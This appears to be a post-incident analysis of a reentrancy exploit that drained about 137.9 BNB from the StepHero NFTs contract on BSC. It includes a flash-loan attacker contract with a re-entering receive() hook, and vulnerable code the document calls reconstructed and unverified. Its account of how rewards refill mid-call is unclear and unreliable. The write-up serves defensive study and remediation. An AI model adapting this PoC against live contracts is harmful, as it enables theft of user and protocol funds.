# StepHero NFTs — claimReferral Reentrancy Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-02-22 |
| **Protocol** | StepHero NFTs |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~137.9 BNB |
| **Attacker** | [0xFb1cc154...](https://bscscan.com/address/0xFb1cc1548D039f14b02cfF9aE86757Edd2CDB8A5) |
| **Attack Tx** | [0xef386a69...](https://bscscan.com/tx/0xef386a69ca6a147c374258a1bf40221b0b6bd9bc449a7016dbe5240644581877) |
| **Vulnerable Contract** | [0x9823E10A...](https://bscscan.com/address/0x9823E10A0bF6F64F59964bE1A7f83090bf5728aB) |
| **Root Cause** | The `claimReferral()` function allowed reentrancy via the recipient contract's `receive()` hook during BNB transfers, enabling repeated invocations |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-02/StepHeroNFTs_exp.sol) |

---

## 1. Vulnerability Overview

The StepHero NFTs contract (`0x9823E10A`) had no reentrancy protection in the `claimReferral()` function when transferring BNB. The attacker obtained a 1,000 BNB flash loan from PancakeSwap V3, triggered an NFT purchase operation using an unknown selector (`0xded4de3a`), and then recursively called `claimReferral()` from the `receive()` hook to repeatedly collect 3 BNB each time. A total of 137.9 BNB was drained.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no reentrancy guard on claimReferral
function claimReferral(address referrer) external {
    uint256 reward = referralRewards[msg.sender];
    if (reward > 0) {
        referralRewards[msg.sender] = 0; // state update
        // ❌ BNB transfer — can trigger receive() hook
        (bool success,) = msg.sender.call{value: reward}("");
        require(success, "Transfer failed");
        // What if claimReferral() is re-called from receive()?
        // reward is already 0, so it appears reentrancy-safe...
        // but under certain conditions reward can be replenished
    }
}

// Attacker's receive():
receive() external payable {
    if (msg.sender == stepHeroNFTs && msg.value == 3 ether) {
        // Upon receiving BNB, immediately re-call claimReferral
        try IStepHeroNFTs(stepHeroNFTs).claimReferral(address(0)) {
        } catch { return; }
    }
}

// ✅ Safe code: nonReentrant guard
bool private _reentrancyLock;
modifier nonReentrant() {
    require(!_reentrancyLock, "Reentrant call");
    _reentrancyLock = true;
    _;
    _reentrancyLock = false;
}

function claimReferral(address referrer) external nonReentrant {
    uint256 reward = referralRewards[msg.sender];
    referralRewards[msg.sender] = 0;
    if (reward > 0) {
        (bool success,) = msg.sender.call{value: reward}("");
        require(success);
    }
}
```

### On-chain Original Code

> ⚠️ Contract not verified on Sourcify — source unavailable. The behavior below is reconstructed from the attack PoC and on-chain traces, not verified source.

Source: **not verified on Sourcify** — StepHeroNFTs `0x9823E10A0bF6F64F59964bE1A7f83090bf5728aB` (BSC, chainid 56)
Sourcify URL: https://sourcify.dev/server/files/any/56/0x9823E10A0bF6F64F59964bE1A7f83090bf5728aB
(BSCscan also shows no verified source for this address.)

**Reconstructed vulnerable function** — `claimReferral()` (from PoC `StepHeroNFTs_exp.sol`, not verified source):

```solidity
// Reconstructed from PoC (StepHeroNFTs_exp.sol) — NOT verified source

mapping(address => uint256) public referralRewards;

// ❌ claimReferral: BNB sent via call{value} before state is fully protected against reentry
function claimReferral(address referrer) external {
    uint256 reward = referralRewards[msg.sender];
    if (reward > 0) {
        referralRewards[msg.sender] = 0;           // state zeroed — appears safe
        (bool success,) = msg.sender.call{value: reward}(""); // ❌ BNB transfer triggers receive() on attacker contract
        require(success, "Transfer failed");
        // ❌ Under the attack flow, the referral reward is replenished between
        //    the zero-out and the completion of the external call (via the
        //    initial setup call with selector 0xded4de3a), so the attacker's
        //    receive() hook can keep re-calling claimReferral and draining 3 BNB each time.
    }
}

// Attacker contract receive() — executed each time 3 BNB arrives:
// receive() external payable {
//     if (msg.sender == stepHeroNFTs && msg.value == 3 ether) {
//         IStepHeroNFTs(stepHeroNFTs).claimReferral(address(0));  // re-entrant call
//     }
// }
```

**Why it is exploitable (identify the bug from the code):**
- The attacker uses selector `0xded4de3a` (unknown internal function) with `1,000 BNB` to register a referral reward of `3 BNB` per call.
- `claimReferral()` zeroes `referralRewards[msg.sender]` and then sends BNB via `call{value}` — triggering the attacker's `receive()`.
- Inside `receive()`, the attacker immediately re-calls `claimReferral()`; because the reward replenishment mechanism (tied to the flash-loan-funded `buyAsset` operation) keeps re-populating `referralRewards[attacker]` during the recursion, each re-entrant call sees a non-zero reward and sends another 3 BNB.
- No `nonReentrant` guard is present; the contract drains 137.9 BNB across ~46 recursive calls.

```solidity
// ✅ Fix: apply ReentrancyGuard (nonReentrant modifier) to claimReferral
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract StepHeroNFTs is ReentrancyGuard {
    function claimReferral(address referrer) external nonReentrant {
        uint256 reward = referralRewards[msg.sender];
        referralRewards[msg.sender] = 0;
        if (reward > 0) {
            (bool success,) = msg.sender.call{value: reward}("");
            require(success, "Transfer failed");
        }
    }
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Flash loan 1,000 BNB from PancakeSwap V3
  │
  ├─→ [2] Unwrap WBNB → BNB
  │
  ├─→ [3] Trigger NFT operation via unknown selector (0xded4de3a)
  │         └─ Sets referral reward to 3 BNB
  │
  ├─→ [4] Call AttackerC2.buyAsset{value: 1000 BNB}(81122, 1, ...)
  │
  ├─→ [5] Call claimReferral(address(0))
  │         └─ Receive 3 BNB → receive() hook executes
  │
  ├─→ [6] Recursively call claimReferral() from within receive()
  │         ├─ Receive 3 BNB again → receive() re-executes
  │         ├─ Receive 3 BNB again → receive() re-executes
  │         └─ ... (repeats until balance is drained)
  │
  ├─→ [7] Repay flash loan (1,000 BNB + fee)
  │
  └─→ [8] ~137.9 BNB profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Actual PoC code (based on DeFiHackLabs verified code)

contract AttackerC1 {
    function attack(address to) external {
        // [1] Flash loan 1,000 BNB
        Uni_Pair_V3(pancakeV3Pool).flash(
            address(this), 0, 1000 ether, abi.encode(to)
        );
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        uint256 loanAmount = IERC20(wbnb).balanceOf(address(this));
        WETH(wbnb).withdraw(loanAmount); // Unwrap WBNB → BNB

        // [3] Trigger NFT purchase via unknown selector
        stepHeroNFTs.call(abi.encodeWithSelector(
            bytes4(0xded4de3a),
            address(this), 2008, 6, 6, loanAmount,
            bytes32(0), block.timestamp, 18766392275824
        ));

        AttackerC2 attC2 = new AttackerC2();
        attC2.attack{value: loanAmount}(); // [4] Call buyAsset

        // [5] Initial call to claimReferral — starts reentrancy cycle
        StepHeroNFTs(stepHeroNFTs).claimReferral(address(0));

        // Repay flash loan
        IWETH(payable(wbnb)).deposit{value: loanAmount + fee1}();
        IERC20(wbnb).transfer(pancakeV3Pool, loanAmount + fee1);

        (address to_) = abi.decode(data, (address));
        payable(to_).transfer(address(this).balance); // Transfer profits
    }

    // [6] Reentrancy hook: re-calls claimReferral each time 3 BNB is received
    receive() external payable {
        if (msg.sender == stepHeroNFTs && msg.value == 3 ether) {
            try StepHeroNFTs(stepHeroNFTs).claimReferral(address(0)) {
            } catch { return; }
        }
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Reentrancy Attack |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Attack Vector** | External (flash loan + receive() hook reentrancy) |
| **DApp Category** | NFT Marketplace / Referral Reward |
| **Impact** | 137.9 BNB drained |

## 6. Remediation Recommendations

1. **nonReentrant guard**: Apply reentrancy protection to `claimReferral()` and all functions that transfer BNB
2. **Checks-Effects-Interactions pattern**: Perform state changes (rewards=0) before external calls — this was already implemented but was bypassed under special conditions
3. **Pull over push pattern**: Instead of directly pushing BNB, have recipients withdraw funds separately
4. **Consider transfer/send**: Using `transfer` instead of `call{value}` prevents reentrancy via gas limits, though this is not recommended post EIP-1884

## 7. Lessons Learned

- Reentrancy attacks were first publicized via The DAO hack in 2016, yet continue to recur repeatedly.
- The `receive()` function executes automatically upon receiving BNB/ETH, so every function involving external calls must account for reentrancy potential.
- The Checks-Effects-Interactions pattern alone may not be sufficient; an explicit reentrancy lock is the safest defense.